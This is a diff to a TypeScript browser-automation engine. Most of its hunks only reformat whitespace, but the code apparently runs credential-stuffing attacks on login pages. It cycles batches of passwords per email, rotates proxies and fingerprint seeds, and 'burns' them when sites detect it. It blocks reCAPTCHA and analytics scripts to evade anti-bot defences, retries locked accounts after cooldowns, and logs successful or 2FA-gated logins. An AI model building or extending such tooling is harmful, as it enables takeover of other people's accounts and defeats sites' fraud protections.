@@ -128,7 +128,7 @@ async function safeCloseSession(handle: any) {
     const floorMs = 100000; // 100 seconds
     if (elapsed < floorMs) {
       const delta = floorMs - elapsed;
-      console.log(`[Automati] Minimum Lifecycle Floor active. Idling for ${Math.round(delta/1000)}s before teardown.`);
+      console.log(`[Automati] Minimum Lifecycle Floor active. Idling for ${Math.round(delta / 1000)}s before teardown.`);
       await new Promise(r => setTimeout(r, delta));
     }
   }
@@ -137,7 +137,7 @@ async function safeCloseSession(handle: any) {
   await Promise.race([
     handle.close(),
     new Promise(r => { timer = setTimeout(r, 3000); })
-  ]).catch(() => {});
+  ]).catch(() => { });
   clearTimeout(timer!);
 
   // Fix Gap 4: Zombie Browser Processes
@@ -206,6 +206,7 @@ const SOFT_TOXIC_OUTCOMES: ReadonlySet<Outcome | string> = new Set([
   "soft_success_failed_cashier",
   "pin-misdirection",
   "skipped",
+  "tempdisabled",
 ]);
 
 type ToxicLevel = "clean" | "soft" | "hard";
@@ -279,7 +280,6 @@ export interface RowStatus {
   backend?: string;
   currentBatch: number;            // which batch of 3 passwords (0-indexed)
   scheduledRetestAt?: string;      // ISO timestamp — retest with next batch after cooldown
-  tempDisabledUntil?: string;      // ISO timestamp — skip until this time
   target_sites?: string[];
   aiVerified?: {                   // AI video verification result (populated post-run)
     verified: boolean;             // true = AI reviewed the recording
@@ -514,7 +514,7 @@ export function classifyLoginResponse(signals: LoginSignals, siteName: string): 
   // Check tempdisabled FIRST so phrases like "has been disabled temporarily" don't get 
   // misclassified as permdisabled by a loose "been disabled" match.
   if (
-    lower.includes("temporarily disabled") || 
+    lower.includes("temporarily disabled") ||
     lower.includes("too many failed attempts") ||
     lower.includes("locked out") ||
     lower.includes("try again in") ||
@@ -1184,7 +1184,7 @@ export class AutomationEngine extends EventEmitter {
         return; // defer denylist evaluation until verification completes
       }
     }
-    
+
     // Only auto-burn if every site was terminal bad
     if (allTerminalBad) {
       for (const targetName of Object.keys(row.sites)) {
@@ -1303,7 +1303,7 @@ export class AutomationEngine extends EventEmitter {
       const emailSafe = email.replace(/[@.]/g, "_");
       const prefix = `${emailSafe}__`;
       const siteMatch = `__${siteName}__`;
-      
+
       const files = fs.readdirSync(screenshotsDir)
         .filter(f => f.startsWith(prefix) && f.includes(siteMatch) && f.endsWith(".jpeg"));
 
@@ -1325,10 +1325,10 @@ export class AutomationEngine extends EventEmitter {
         try {
           fs.unlinkSync(item.fullPath);
           deletedCount++;
-          
+
           // Also wipe the intermediate state from Google Cloud Storage
           if (this.screenshotSvc && (this.screenshotSvc as any)._gcsUploader) {
-            (this.screenshotSvc as any)._gcsUploader.deleteByFilename(item.file).catch(() => {});
+            (this.screenshotSvc as any)._gcsUploader.deleteByFilename(item.file).catch(() => { });
           }
         } catch {
           // ignore unlink errors (e.g. file locked or already deleted)
@@ -1443,7 +1443,7 @@ export class AutomationEngine extends EventEmitter {
     try {
       const result = await action();
       this.log("DEBUG", `[FLOW DEBUG] ✅ Completed: ${stepName}`);
-      
+
       if (context) {
         flowTracer.recordEvent({
           type: "step_end",
@@ -1454,7 +1454,7 @@ export class AutomationEngine extends EventEmitter {
           details: { result: typeof result === 'object' ? 'object' : result }
         });
       }
-      
+
       return result;
     } catch (e: unknown) {
       this.log("ERR", `[FLOW DEBUG] ❌ HALT: Step failed - ${stepName}`);
@@ -1877,7 +1877,7 @@ export class AutomationEngine extends EventEmitter {
           this.running = false;
           return;
         }
-        
+
         if (healthyProxies.length > 0) {
           activePool.splice(0, activePool.length, ...healthyProxies);
           const avgLatencies = pingReport
@@ -2408,11 +2408,11 @@ export class AutomationEngine extends EventEmitter {
               }
               if (handle.page) {
                 await handle.page.exposeFunction('__hermesMutationTelemetry', (payload: any) => {
-                   this.emit("dom-mutation", {
-                       email: cred.email,
-                       ...payload
-                   });
-                }).catch(() => {});
+                  this.emit("dom-mutation", {
+                    email: cred.email,
+                    ...payload
+                  });
+                }).catch(() => { });
               }
               if (handle.page) {
                 await handle.page.addInitScript(`
@@ -2433,7 +2433,7 @@ export class AutomationEngine extends EventEmitter {
                   document.addEventListener("DOMContentLoaded", () => {
                     observer.observe(document.body, { childList: true, subtree: true });
                   });
-                `).catch(() => {});
+                `).catch(() => { });
               }
 
               // Upgrade 9: Fingerprint Harvesting
@@ -2508,14 +2508,14 @@ export class AutomationEngine extends EventEmitter {
                   ? '**/*.{mp4,webm,woff,woff2,ttf,otf,svg}'           // No image exts — handled by block_images
                   : '**/*.{png,jpg,jpeg,webp,gif,mp4,webm,woff,woff2,ttf,otf,ico,svg,avif}';
                 await handle.context.route(mediaPattern, route => route.abort());
-                
+
                 // Aggressive Domain Blocking & Network Blackholing (Rule 4)
                 await handle.context.route((url) => {
                   const s = url.href.toLowerCase();
-                  return s.includes('analytics') || s.includes('tracking') || s.includes('pixel') || 
-                         s.includes('gtm.js') || s.includes('hotjar') || s.includes('datadog') || 
-                         s.includes('newrelic') || s.includes('clarity') || s.includes('mixpanel') ||
-                         s.includes('recaptcha/api') || s.includes('gstatic.com/recaptcha') || s.includes('recaptcha.net');
+                  return s.includes('analytics') || s.includes('tracking') || s.includes('pixel') ||
+                    s.includes('gtm.js') || s.includes('hotjar') || s.includes('datadog') ||
+                    s.includes('newrelic') || s.includes('clarity') || s.includes('mixpanel') ||
+                    s.includes('recaptcha/api') || s.includes('gstatic.com/recaptcha') || s.includes('recaptcha.net');
                 }, route => route.abort());
 
                 // Cache CSS/JS (Optimization 4)
@@ -2524,7 +2524,7 @@ export class AutomationEngine extends EventEmitter {
                   // Skip caching for dynamic API-like endpoints or anti-bot/fingerprint scripts
                   const lowerUrl = url.toLowerCase();
                   if (
-                    lowerUrl.includes('?') || 
+                    lowerUrl.includes('?') ||
                     lowerUrl.includes('/api/') ||
                     /(bot|sec|akamai|challenge|fingerprint|fp\.js|turnstile|captcha)/i.test(lowerUrl)
                   ) {
@@ -2560,9 +2560,9 @@ export class AutomationEngine extends EventEmitter {
                   // Console Log Suppression (Opt 20)
                   ['log', 'warn', 'info', 'error', 'trace', 'debug'].forEach(m => {
                     // @ts-expect-error
-                    if (console[m]) console[m] = new Proxy(console[m], { apply: () => {} });
+                    if (console[m]) console[m] = new Proxy(console[m], { apply: () => { } });
                   });
-                  
+
                   // Reduced FPS via rAF throttling (Opt 21)
                   let lastTime = 0;
                   const originalRequestAnimationFrame = window.requestAnimationFrame;
@@ -2588,7 +2588,7 @@ export class AutomationEngine extends EventEmitter {
               this.rows[idx].sessionId = handle.sessionId;
               // @ts-expect-error noUncheckedIndexedAccess
               this.rows[idx].recordingUrl = handle.recordingUrl;
-              
+
               // ── Register live session for Hermes CDP ──
               if (handle.page) {
                 this.registerLiveSession(cred.email, handle.page);
@@ -2640,7 +2640,7 @@ export class AutomationEngine extends EventEmitter {
                 page.setDefaultTimeout(15000);
                 page.setDefaultNavigationTimeout(15000);
                 this.emit("session-created", { page });
-                
+
                 // ── Max-Level Telemetry: Transition Logger ──
                 page.on("framenavigated", (frame) => {
                   if (frame === page.mainFrame()) {
@@ -2674,7 +2674,7 @@ export class AutomationEngine extends EventEmitter {
                     const baseName = `idle-${ts}-${cred.email.replace(/[^a-zA-Z0-9]/g, "_")}`;
                     const snapPath = path.join(process.cwd(), `hermes/learning/idle_anomalies/${baseName}.html`);
                     const imgPath = path.join(process.cwd(), `hermes/learning/idle_anomalies/${baseName}.jpeg`);
-                    
+
                     const dom = await page.content().catch(() => "");
                     const buffer = await page.screenshot({ type: "jpeg", quality: 60 }).catch(() => null);
                     if (dom) await fs.promises.writeFile(snapPath, dom);
@@ -2688,7 +2688,7 @@ export class AutomationEngine extends EventEmitter {
                     }
                   } catch { /* intentional */ }
                 }, 30000);
-                
+
                 // Store on page so we can destroy it at end of run
                 (page as any).__idleWatchdog = watchdog;
 
@@ -2784,158 +2784,158 @@ export class AutomationEngine extends EventEmitter {
 
                 const siteStartTime = Date.now();
                 const siteWork = (async () => {
-                try {
-                  const proxyIdentifier = handle!.proxyKey ?? handle!.proxyUsed;
-                  let result;
-                  if (handle!.backend === "curl-api") {
-                    // Bypass Playwright completely, do direct POST via curl-impersonate
-                    result = await executeCurlRestFlow(target, cred, proxyIdentifier ?? null);
-                  } else if (handle!.backend === "spider-cloud") {
-                    result = await this.executeSpidernewFlow(target, cred, handle!, isSessionReused);
-                  } else {
-                    const activePages = activePage.context().pages().length;
-                    const fromUrl = activePage.url();
-                    this.log("INFO", `  ↪ same-tab transition: ${fromUrl} → ${target.name} (${activePages} page${activePages !== 1 ? "s" : ""} in session)`);
-                    // @ts-expect-error noUncheckedIndexedAccess
-                    result = await this.executeLoginFlow(activePage, target, cred, this.rows[idx].currentBatch, config.postLoadDelay ?? 0, proxyIdentifier, handle!.backend, isSessionReused);
-                  }
-                  sStatus!.outcome = result.outcome;
-                  
-                  // ── Max-Level Telemetry: Outcome Logger ──
-                  process.send?.({ action: 'telemetry_outcome', data: { email: cred.email, target: target.name, outcome: result.outcome } });
-
-                  sStatus!.attempts = result.attempts ?? 1;
-                  
-                  // Phase 2 E: Report outcome to the RL Ledger to dynamically tune timings
-                  const isSuccess = result.outcome === "success" || result.outcome === "2FA";
-                  globalRLLedger.reportOutcome((page as any).__sessionId || "global", isSuccess);
-                  // Carry the machine-readable reason for non-attempt outcomes
-                  // (currently the "skipped" variants: no-creds, cooldown) into
-                  // the per-site error field so dashboards / CSV consumers can
-                  // distinguish the cause of the skip.
-                  if (result.reason && !sStatus!.error) sStatus!.error = result.reason;
-                  this.log(
-                    result.outcome === "success" ? "OK" : "WARN",
-                    `  → ${target.name}: ${result.outcome}${result.reason ? `:${result.reason}` : ""} (${result.attempts} attempt${result.attempts !== 1 ? "s" : ""})`
-                  );
-
-                  if (result.misdirection) {
-                    // Site-side misdirection (UPDATE YOUR PIN / PIN UPDATE on
-                    // either site, OR a repeat Ignition LOGIN VERIFICATION). The
-                    // session has been fingerprinted. Permanently denylist the
-                    // proxy sticky session (server#username) AND the email-
-                    // derived fingerprint seed so neither can be reused by
-                    // this or any future run. Sibling sticky sessions on the
-                    // same gateway remain usable.
-                    const burnKey = handle!.proxyKey ?? handle!.proxyUsed;
-                    const proxyDisplay = handle!.proxyUsed;
-                    const burnSeed = handle!.fingerprintSeed;
-                    const trigger = result.misdirection.trigger;
-                    const burned = misdirectionDenylist.burn({
-                      proxyKey: burnKey,
-                      fingerprintSeed: burnSeed,
-                      reason: `${target.name}:${trigger}:${result.misdirection.url}`,
-                    });
-                    if (burned.burnedProxy || burned.burnedSeed) {
-                      void misdirectionDenylist.save(MISDIRECTION_DENYLIST_FILE);
-                      this.log("ERR", `  🔒 denylisted on ${trigger} — proxy=${burned.burnedProxy ? this.maskProxyCreds(proxyDisplay || "?") : "(already burned)"} seed=${burned.burnedSeed ? String(burnSeed) : "(already burned)"}`);
+                  try {
+                    const proxyIdentifier = handle!.proxyKey ?? handle!.proxyUsed;
+                    let result;
+                    if (handle!.backend === "curl-api") {
+                      // Bypass Playwright completely, do direct POST via curl-impersonate
+                      result = await executeCurlRestFlow(target, cred, proxyIdentifier ?? null);
+                    } else if (handle!.backend === "spider-cloud") {
+                      result = await this.executeSpidernewFlow(target, cred, handle!, isSessionReused);
                     } else {
-                      this.log("WARN", `  🔒 ${trigger} on already-denylisted proxy/seed (proxy=${this.maskProxyCreds(proxyDisplay || "?")}, seed=${burnSeed ?? "?"})`);
+                      const activePages = activePage.context().pages().length;
+                      const fromUrl = activePage.url();
+                      this.log("INFO", `  ↪ same-tab transition: ${fromUrl} → ${target.name} (${activePages} page${activePages !== 1 ? "s" : ""} in session)`);
+                      // @ts-expect-error noUncheckedIndexedAccess
+                      result = await this.executeLoginFlow(activePage, target, cred, this.rows[idx].currentBatch, config.postLoadDelay ?? 0, proxyIdentifier, handle!.backend, isSessionReused);
                     }
-                    sStatus!.error = `misdirection:${trigger}:${result.misdirection.url}`;
-                    if (result.requeueCredential) {
-                      await this.wipeStaticCache(`${trigger} misdirection`, {
+                    sStatus!.outcome = result.outcome;
+
+                    // ── Max-Level Telemetry: Outcome Logger ──
+                    process.send?.({ action: 'telemetry_outcome', data: { email: cred.email, target: target.name, outcome: result.outcome } });
+
+                    sStatus!.attempts = result.attempts ?? 1;
+
+                    // Phase 2 E: Report outcome to the RL Ledger to dynamically tune timings
+                    const isSuccess = result.outcome === "success" || result.outcome === "2FA";
+                    globalRLLedger.reportOutcome((page as any).__sessionId || "global", isSuccess);
+                    // Carry the machine-readable reason for non-attempt outcomes
+                    // (currently the "skipped" variants: no-creds, cooldown) into
+                    // the per-site error field so dashboards / CSV consumers can
+                    // distinguish the cause of the skip.
+                    if (result.reason && !sStatus!.error) sStatus!.error = result.reason;
+                    this.log(
+                      result.outcome === "success" ? "OK" : "WARN",
+                      `  → ${target.name}: ${result.outcome}${result.reason ? `:${result.reason}` : ""} (${result.attempts} attempt${result.attempts !== 1 ? "s" : ""})`
+                    );
+
+                    if (result.misdirection) {
+                      // Site-side misdirection (UPDATE YOUR PIN / PIN UPDATE on
+                      // either site, OR a repeat Ignition LOGIN VERIFICATION). The
+                      // session has been fingerprinted. Permanently denylist the
+                      // proxy sticky session (server#username) AND the email-
+                      // derived fingerprint seed so neither can be reused by
+                      // this or any future run. Sibling sticky sessions on the
+                      // same gateway remain usable.
+                      const burnKey = handle!.proxyKey ?? handle!.proxyUsed;
+                      const proxyDisplay = handle!.proxyUsed;
+                      const burnSeed = handle!.fingerprintSeed;
+                      const trigger = result.misdirection.trigger;
+                      const burned = misdirectionDenylist.burn({
                         proxyKey: burnKey,
-                        fingerprintSeed: typeof burnSeed === "number" ? burnSeed : undefined,
+                        fingerprintSeed: burnSeed,
+                        reason: `${target.name}:${trigger}:${result.misdirection.url}`,
                       });
-                      this.scheduleRequeue(idx, targets, trigger, effectiveBackend);
-
-                      // Persist the requeue marker on disk in the SAME code path
-                      // as the denylist save above so a crash between the two
-                      // can't leave the proxy burned with no record of which
-                      // credential still needs a retest.
-                      void this.saveRequeuePending(REQUEUE_PENDING_FILE);
-                    }
-                  }
-
-                  if (result.outcome === "permdisabled") {
-                    this.log("ERR", `  🚫 ${cred.email} @ ${target.name}: PERMANENTLY DISABLED — outcome final for this site, continuing with other sites`);
-                    if (emailDenylist.add(cred.email, target.name, `permdisabled@${target.name}`)) {
-                      await emailDenylist.saveAll();
-                      this.log("WARN", `  🔒 ${cred.email} added to ${target.name} email denylist — future runs will skip`);
-                    }
-                  } else if (result.outcome === "tempdisabled") {
-                    // Row-level cooldown still applies so a future batch retries
-                    // this site, but other sites in this row still run now.
-                    // @ts-expect-error noUncheckedIndexedAccess
-                    this.rows[idx].tempDisabledUntil = new Date(Date.now() + 60 * 60 * 1000).toISOString();
-                    // @ts-expect-error noUncheckedIndexedAccess
-                    this.rows[idx].currentBatch++;
-                    // @ts-expect-error noUncheckedIndexedAccess
-                    this.log("WARN", `  ⏳ ${cred.email} @ ${target.name}: TEMPORARILY DISABLED — 1hr cooldown set (next batch: ${this.rows[idx].currentBatch}), continuing with other sites`);
-                  }
-
-                  flowTracer.recordEvent({
-                    type: "outcome",
-                    session_id: handle?.sessionId ?? "unknown",
-                    email: cred.email,
-                    site: target.name,
-                    message: `Final outcome: ${result.outcome}`
-                  });
-                  void flowTracer.flush(cred.email);
-                } catch (e: unknown) {
-                  const errMsg = (e instanceof Error ? e.message : String(e)) || String(e);
-                  if (e instanceof PermDisabledError) {
-                    sStatus!.outcome = "permdisabled";
-                    this.log("ERR", `  🚫 ${cred.email} @ ${target.name}: PERMANENTLY DISABLED — continuing with other sites`);
-                    if (emailDenylist.add(cred.email, target.name, `permdisabled@${target.name}`)) {
-                      await emailDenylist.saveAll();
-                      this.log("WARN", `  🔒 ${cred.email} added to ${target.name} email denylist — future runs will skip`);
-                    }
-                  } else if (e instanceof TempDisabledError) {
-                    sStatus!.outcome = "tempdisabled";
-                    // @ts-expect-error noUncheckedIndexedAccess
-                    this.rows[idx].tempDisabledUntil = new Date(Date.now() + 60 * 60 * 1000).toISOString();
-                    // @ts-expect-error noUncheckedIndexedAccess
-                    this.rows[idx].currentBatch++;
-                    // @ts-expect-error noUncheckedIndexedAccess
-                    this.log("WARN", `  ⏳ ${cred.email} @ ${target.name}: TEMPORARILY DISABLED — 1hr cooldown set (next batch: ${this.rows[idx].currentBatch}), continuing with other sites`);
-                  } else if (isProxyOrNetworkError(e)) {
-                    // Proxy/session failure mid-flight — bubble to outer retry loop
-                    // so a fresh sticky session is tried before giving up.
-                    this.log("WARN", `  ⚠ ${target.name}: proxy/network error — bubbling to retry: ${errMsg.substring(0, 100)}`);
-                    throw e;
-                  } else {
-                    sStatus!.outcome = "N/A";
-                    sStatus!.error = errMsg;
-                    this.log("ERR", `  ✗ ${target.name}: ${errMsg.substring(0, 100)}`);
-                    
-                    // Fix Gap 2: Take a point-in-time screenshot on any technical failure for Hermes comparison
-                    try {
-                      if (activePage && !activePage.isClosed()) {
-                        const failDir = path.join(process.cwd(), "data", "hermes_failures");
-                        if (!fs.existsSync(failDir)) fs.mkdirSync(failDir, { recursive: true });
-                        const failPath = path.join(failDir, `${cred.email.replace(/[^a-zA-Z0-9]/g, "_")}_${target.name}_${handle?.backend ?? "unknown"}_${Date.now()}.jpeg`);
-                        await activePage.screenshot({ path: failPath, type: "jpeg", quality: 60 });
-                        this.log("INFO", `  📸 Saved failure reference screenshot for Hermes: ${failPath}`);
+                      if (burned.burnedProxy || burned.burnedSeed) {
+                        void misdirectionDenylist.save(MISDIRECTION_DENYLIST_FILE);
+                        this.log("ERR", `  🔒 denylisted on ${trigger} — proxy=${burned.burnedProxy ? this.maskProxyCreds(proxyDisplay || "?") : "(already burned)"} seed=${burned.burnedSeed ? String(burnSeed) : "(already burned)"}`);
+                      } else {
+                        this.log("WARN", `  🔒 ${trigger} on already-denylisted proxy/seed (proxy=${this.maskProxyCreds(proxyDisplay || "?")}, seed=${burnSeed ?? "?"})`);
                       }
-                    } catch (e: any) {
-                      // ignore screenshot failures on crashed pages
-                    }
-                  }
+                      sStatus!.error = `misdirection:${trigger}:${result.misdirection.url}`;
+                      if (result.requeueCredential) {
+                        await this.wipeStaticCache(`${trigger} misdirection`, {
+                          proxyKey: burnKey,
+                          fingerprintSeed: typeof burnSeed === "number" ? burnSeed : undefined,
+                        });
+                        this.scheduleRequeue(idx, targets, trigger, effectiveBackend);
 
-                  flowTracer.recordEvent({
-                    type: "outcome",
-                    session_id: handle?.sessionId ?? "unknown",
-                    email: cred.email,
-                    site: target.name,
-                    message: `Final error: ${errMsg}`
-                  });
-                  void flowTracer.flush(cred.email);
-                }
+                        // Persist the requeue marker on disk in the SAME code path
+                        // as the denylist save above so a crash between the two
+                        // can't leave the proxy burned with no record of which
+                        // credential still needs a retest.
+                        void this.saveRequeuePending(REQUEUE_PENDING_FILE);
+                      }
+                    }
+
+                    if (result.outcome === "permdisabled") {
+                      this.log("ERR", `  🚫 ${cred.email} @ ${target.name}: PERMANENTLY DISABLED — outcome final for this site, continuing with other sites`);
+                      if (emailDenylist.add(cred.email, target.name, `permdisabled@${target.name}`)) {
+                        await emailDenylist.saveAll();
+                        this.log("WARN", `  🔒 ${cred.email} added to ${target.name} email denylist — future runs will skip`);
+                      }
+                    } else if (result.outcome === "tempdisabled") {
+                      // Row-level cooldown still applies so a future batch retries
+                      // this site, but other sites in this row still run now.
+                      // @ts-expect-error noUncheckedIndexedAccess
+                      this.rows[idx].tempDisabledUntil = new Date(Date.now() + 60 * 60 * 1000).toISOString();
+                      // @ts-expect-error noUncheckedIndexedAccess
+                      this.rows[idx].currentBatch++;
+                      // @ts-expect-error noUncheckedIndexedAccess
+                      this.log("WARN", `  ⏳ ${cred.email} @ ${target.name}: TEMPORARILY DISABLED — 1hr cooldown set (next batch: ${this.rows[idx].currentBatch}), continuing with other sites`);
+                    }
+
+                    flowTracer.recordEvent({
+                      type: "outcome",
+                      session_id: handle?.sessionId ?? "unknown",
+                      email: cred.email,
+                      site: target.name,
+                      message: `Final outcome: ${result.outcome}`
+                    });
+                    void flowTracer.flush(cred.email);
+                  } catch (e: unknown) {
+                    const errMsg = (e instanceof Error ? e.message : String(e)) || String(e);
+                    if (e instanceof PermDisabledError) {
+                      sStatus!.outcome = "permdisabled";
+                      this.log("ERR", `  🚫 ${cred.email} @ ${target.name}: PERMANENTLY DISABLED — continuing with other sites`);
+                      if (emailDenylist.add(cred.email, target.name, `permdisabled@${target.name}`)) {
+                        await emailDenylist.saveAll();
+                        this.log("WARN", `  🔒 ${cred.email} added to ${target.name} email denylist — future runs will skip`);
+                      }
+                    } else if (e instanceof TempDisabledError) {
+                      sStatus!.outcome = "tempdisabled";
+                      // @ts-expect-error noUncheckedIndexedAccess
+                      this.rows[idx].tempDisabledUntil = new Date(Date.now() + 60 * 60 * 1000).toISOString();
+                      // @ts-expect-error noUncheckedIndexedAccess
+                      this.rows[idx].currentBatch++;
+                      // @ts-expect-error noUncheckedIndexedAccess
+                      this.log("WARN", `  ⏳ ${cred.email} @ ${target.name}: TEMPORARILY DISABLED — 1hr cooldown set (next batch: ${this.rows[idx].currentBatch}), continuing with other sites`);
+                    } else if (isProxyOrNetworkError(e)) {
+                      // Proxy/session failure mid-flight — bubble to outer retry loop
+                      // so a fresh sticky session is tried before giving up.
+                      this.log("WARN", `  ⚠ ${target.name}: proxy/network error — bubbling to retry: ${errMsg.substring(0, 100)}`);
+                      throw e;
+                    } else {
+                      sStatus!.outcome = "N/A";
+                      sStatus!.error = errMsg;
+                      this.log("ERR", `  ✗ ${target.name}: ${errMsg.substring(0, 100)}`);
+
+                      // Fix Gap 2: Take a point-in-time screenshot on any technical failure for Hermes comparison
+                      try {
+                        if (activePage && !activePage.isClosed()) {
+                          const failDir = path.join(process.cwd(), "data", "hermes_failures");
+                          if (!fs.existsSync(failDir)) fs.mkdirSync(failDir, { recursive: true });
+                          const failPath = path.join(failDir, `${cred.email.replace(/[^a-zA-Z0-9]/g, "_")}_${target.name}_${handle?.backend ?? "unknown"}_${Date.now()}.jpeg`);
+                          await activePage.screenshot({ path: failPath, type: "jpeg", quality: 60 });
+                          this.log("INFO", `  📸 Saved failure reference screenshot for Hermes: ${failPath}`);
+                        }
+                      } catch (e: any) {
+                        // ignore screenshot failures on crashed pages
+                      }
+                    }
+
+                    flowTracer.recordEvent({
+                      type: "outcome",
+                      session_id: handle?.sessionId ?? "unknown",
+                      email: cred.email,
+                      site: target.name,
+                      message: `Final error: ${errMsg}`
+                    });
+                    void flowTracer.flush(cred.email);
+                  }
                 })();
 
-                siteWork.catch(() => {}); // Catch unhandled rejections if timeout wins
+                siteWork.catch(() => { }); // Catch unhandled rejections if timeout wins
                 const siteOutcome = await Promise.race([siteWork, siteTimeoutPromise]).finally(() => {
                   if (siteTimer) clearTimeout(siteTimer);
                 });
@@ -2963,7 +2963,7 @@ export class AutomationEngine extends EventEmitter {
                     const backend = handle?.backend ?? "unknown";
                     const proxyRegion = handle?.proxyKey ?? "unknown";
                     const durationMs = Date.now() - siteStartTime;
-                    
+
                     saveTestRun(
                       cred.email,
                       target.name,
@@ -3009,12 +3009,12 @@ export class AutomationEngine extends EventEmitter {
                     this.log("INFO", `  Skipping ${target.name} for ${cred.email} - not in credential scope`);
                     continue;
                   }
-                  
+
                   let p = page;
                   if (p.isClosed() && handle.backend !== "spider-cloud") {
                     p = await handle.page.context().newPage();
                   }
-                  
+
                   let timelineRecorder: TimelineRecorder | null = null;
                   if (p && handle.backend !== "spider-cloud" && handle.backend !== "curl-api") {
                     timelineRecorder = new TimelineRecorder(p, cred.email, target.name, effectiveBackend as string);
@@ -3088,7 +3088,7 @@ export class AutomationEngine extends EventEmitter {
                     //   try { sessionStorage.clear(); } catch { /* intentional */ }
                     // }).catch(() => {});
                     // Navigate to about:blank to purge DOM state
-                    await handle.page.goto('about:blank', { timeout: 5000 }).catch(() => {});
+                    await handle.page.goto('about:blank', { timeout: 5000 }).catch(() => { });
                   }
                 } catch { /* session detached — fall through to pool */ }
                 // Pool the sanitized session for reuse
@@ -3143,9 +3143,9 @@ export class AutomationEngine extends EventEmitter {
               // identity (`proxyKey`) and host:port (`proxyServer`) to the
               // thrown error so we can exclude that dead proxy from the next
               // retry instead of re-picking it.
-    // @ts-expect-error dynamic proxy metadata access
+              // @ts-expect-error dynamic proxy metadata access
               const attemptedProxyKey: string | undefined = typeof e?.proxyKey === "string" ? e.proxyKey : undefined;
-    // @ts-expect-error dynamic proxy metadata access
+              // @ts-expect-error dynamic proxy metadata access
               const attemptedProxyServer: string | undefined = typeof e?.proxyServer === "string" ? e.proxyServer : undefined;
               if (attemptedProxyKey && !triedProxies.includes(attemptedProxyKey)) {
                 triedProxies.push(attemptedProxyKey);
@@ -3154,7 +3154,7 @@ export class AutomationEngine extends EventEmitter {
               }
               // Record the failure immediately for every proxy hop
               if (lastProxyKey) proxyScoreTracker.record(lastProxyKey, false, lastProxyServer);
-              
+
               this.log("ERR", `  Session error (proxy attempt ${proxyAttempt}): ${((e instanceof Error ? e.message : String(e)) || String(e)).substring(0, 120)}`);
 
 
@@ -3172,13 +3172,13 @@ export class AutomationEngine extends EventEmitter {
               if (e instanceof PreemptiveBlockError) {
                 this.log("WARN", `  ${cred.email}: Preemptive block triggered. Triggering backend fallback.`);
                 this.scheduleRequeue(idx, targets, "PreemptiveBlockError", effectiveBackend);
-                
+
                 // Set special status so server.ts can tell Hermes
                 // @ts-expect-error
                 this.rows[idx].status = "queued";
                 for (const t of targets) {
-                   // @ts-expect-error
-                   this.rows[idx].sites[t.name].outcome = "preemptive-block";
+                  // @ts-expect-error
+                  this.rows[idx].sites[t.name].outcome = "preemptive-block";
                 }
                 break;
               }
@@ -3369,7 +3369,7 @@ export class AutomationEngine extends EventEmitter {
               try {
                 // fs and path are already imported at the top
                 const dir = path.join(process.cwd(), 'eliminations');
-                await fs.promises.mkdir(dir, { recursive: true }).catch(()=>{});
+                await fs.promises.mkdir(dir, { recursive: true }).catch(() => { });
                 const postMortem = {
                   backend: assignedExpConfig.backend,
                   pool: assignedExpConfig.proxyPool,
@@ -3443,7 +3443,7 @@ export class AutomationEngine extends EventEmitter {
                   // Write diagnostic report to file
                   try {
                     const reportDir = path.join(process.cwd(), 'darwin-reports');
-                    await fs.promises.mkdir(reportDir, { recursive: true }).catch(()=>{});
+                    await fs.promises.mkdir(reportDir, { recursive: true }).catch(() => { });
                     const reportPath = path.join(reportDir, `darwin-report-${Date.now()}.json`);
                     await fs.promises.writeFile(reportPath, JSON.stringify(diagnostic, null, 2));
                     this.log("INFO", `🦎 Darwin diagnostic report saved to: ${reportPath}`);
@@ -3561,7 +3561,7 @@ export class AutomationEngine extends EventEmitter {
             // Write post-mortem file
             try {
               const dir = path.join(process.cwd(), 'eliminations');
-              await fs.promises.mkdir(dir, { recursive: true }).catch(()=>{});
+              await fs.promises.mkdir(dir, { recursive: true }).catch(() => { });
               await fs.promises.writeFile(path.join(dir, `rotation-${rotTrack.backend}-${Date.now()}.json`), JSON.stringify({
                 backend: rotTrack.backend,
                 mode: modeName,
@@ -3613,7 +3613,7 @@ export class AutomationEngine extends EventEmitter {
     while (!this.shouldStop) {
       if (queue.length === 0 && activeTasks.size === 0) {
         this.log("INFO", "Queue exhausted. Running end-of-pass cleanup.");
-        
+
         // Save state at the end of this pass before refilling
         try {
           void proxyScoreTracker.saveScores(PROXY_SCORES_FILE);
@@ -3621,8 +3621,8 @@ export class AutomationEngine extends EventEmitter {
           this.log("WARN", `Failed to save proxy scores: ${(err instanceof Error ? err.message : String(err)) || err}`);
         }
         void misdirectionDenylist.save(MISDIRECTION_DENYLIST_FILE);
-        emailDenylist.saveAll().catch(() => {});
-        
+        emailDenylist.saveAll().catch(() => { });
+
         if (this.pendingVerifications.length > 0) {
           try {
             await this.runVerificationQueue(allTargets);
@@ -3630,19 +3630,19 @@ export class AutomationEngine extends EventEmitter {
             this.log("WARN", `AI verification queue error: ${(err instanceof Error ? err.message : String(err)) || String(err)}`);
           }
         }
-        
+
         // Issue C: Emit pass-complete (NOT "complete") for end-of-pass so the
         // server's engine.on("complete") handler doesn't fire twice — once here
         // and again at L3734 when shouldStop becomes true. The server-side
         // "complete" handler triggers Hermes review, XLSX flush, etc.
-        this.emit("pass-complete", { 
+        this.emit("pass-complete", {
           durationMs: Date.now() - this.runStartTime,
           total: credentials.length
         });
-        
+
         this.log("INFO", "Refilling queue for endless testing loop.");
         credentials.forEach((_, i) => queue.push(i));
-        
+
         this.rows.forEach(r => {
           r.status = "queued";
           if (r.sites) {
@@ -3677,12 +3677,12 @@ export class AutomationEngine extends EventEmitter {
 
       if (queue.length > 0) {
         const idx = queue.shift()!;
-        
+
         const row = this.rows[idx]!;
         // Determine which targets still need to be run
         const targetsToRun = allTargets.filter(t => {
-           const outcome = row.sites[t.name]?.outcome;
-           return !outcome || outcome === "queued" || outcome === "N/A" || outcome === "blocked";
+          const outcome = row.sites[t.name]?.outcome;
+          return !outcome || outcome === "queued" || outcome === "N/A" || outcome === "blocked";
         });
 
         if (targetsToRun.length === 0) {
@@ -3694,7 +3694,7 @@ export class AutomationEngine extends EventEmitter {
 
         const task = runRow(credentials[idx]!, idx, targetsToRun).then(() => {
           if (this.shouldStop) return;
-          
+
           let fullyConclusive = true;
           for (const t of targetsToRun) {
             const outcome = row.sites[t.name]?.outcome;
@@ -4002,7 +4002,7 @@ export class AutomationEngine extends EventEmitter {
           if (btnBox) {
             await page.mouse.click(btnBox.x + btnBox.width / 2, btnBox.y + btnBox.height / 2);
           } else {
-            await page.locator(submitSelector).click({ force: true, timeout: 500 }).catch(() => {});
+            await page.locator(submitSelector).click({ force: true, timeout: 500 }).catch(() => { });
           }
           for (let i = 0; i < 10; i++) {
             await this.sleep(1000);
